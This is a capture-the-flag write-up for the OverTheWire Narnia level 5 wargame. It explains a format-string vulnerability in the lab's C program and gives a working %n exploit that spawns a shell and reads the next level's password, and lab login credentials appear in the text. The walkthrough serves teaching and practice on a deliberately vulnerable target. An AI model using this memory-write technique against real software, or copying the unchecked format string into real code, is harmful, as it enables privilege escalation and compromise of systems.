## Login 

` SSH : ssh narnia5@narnia.labs.overthewire.org -p 2226 `
` Pass : Ni3xHPEuuw `

## Solution

First, let’s try to execute the program…

```
$ ssh narnia5@narnia.labs.overthewire.org -p 2226

narnia5@narnia:~$ cd /narnia/
narnia5@narnia:/narnia$ ./narnia5
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [] (0)
i = 1 (0xffffd6d0)
```

So, we need to modify the **i** variable with the value **500**. We also know the address of **i** which is equal to `0xffffd6d0`.
### Source Code

Here is the source code.

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){
	int i = 1;
	char buffer[64];

	snprintf(buffer, sizeof buffer, argv[1]);
	buffer[sizeof (buffer) - 1] = 0;
	printf("Change i's value from 1 -> 500. ");

	if(i==500){
		printf("GOOD\n");
        setreuid(geteuid(),geteuid());
		system("/bin/sh");
	}

	printf("No way...let me give you a hint!\n");
	printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
	printf ("i = %d (%p)\n", i, &i);
	return 0;
}
```

The issue here is the _snprintf()_ function, as you can see there are no format specifiers. It means that we have a potential **format string** vulnerability here. Let’s try to enter some format specifiers in our input :

```
./narnia5 %x.%x.%x
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [f7fc5000.30303035.3330332e] (26)
i = 1 (0xffffd6d0)
```

Ok, it’s definitly a format string vulnerability. With this kind of issue, we can write where we want in memory as long as we know where. Luckily, the program gives us the address of **i**.

Now, to write something on the stack we’ll use the **%n** specifier. Basically, **%n** write the size of our input at the address pointed by _%n_. For example, the following input : **AAAA%n**, means that we will write the value **4** (because the size of “AAAA” equals 4 bytes) at the address pointed by %n. But, where on the stack **%n** points to ?

Well, let’s say we want to write **4** at **AAAA** (`0x41414141`), we need to find the position of **AAAA** on the stack. To do that we’ll just enter the address followed by some **%x** specifiers :

```
narnia5@narnia:/narnia$ ./narnia5 AAAA%08x.%08x.%08x.%08x.%08x.%08x
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [AAAA41414141.31343134.31343134.3331332e.33313334.31332e34] (57)
i = 1 (0xffffd6b0)
```

In this case, the address is in the first position on the stack so, the exploit would look like this :

```
narnia5@narnia:/narnia$ ./narnia5 $(python -c 'print "AAAA" + "%1$n"')
Segmentation fault
```

Obviously, it segfault as we try to write the value **4** at a random address. Note the `%1$n`, the **1** specify the position of our address on the stack. If it was on the 3rd postion we would have used `%3$n`.

However we don’t want to write **4**, we want to write **500**. To do that we will use `%<size>$x`, it will serve as padding. Instead of writting our address followed by **496** chars, we’ll use **%496$x**.

Let’s try :

```
narnia5@narnia:/narnia$ ./narnia5 $(python -c 'print "\xc0\xd6\xff\xff" + "%496x%1$n"')
Change i's value from 1 -> 500. GOOD
$ whoami
narnia6
$ cat /etc/narnia_pass/narnia6
BNSjoSDeGL
```

Format strings are more complex than standard buffer overflow. If you are interested, you can read [this Guy's post](https://axcheron.github.io/exploit-101-format-strings/) about this kind of vulnerability.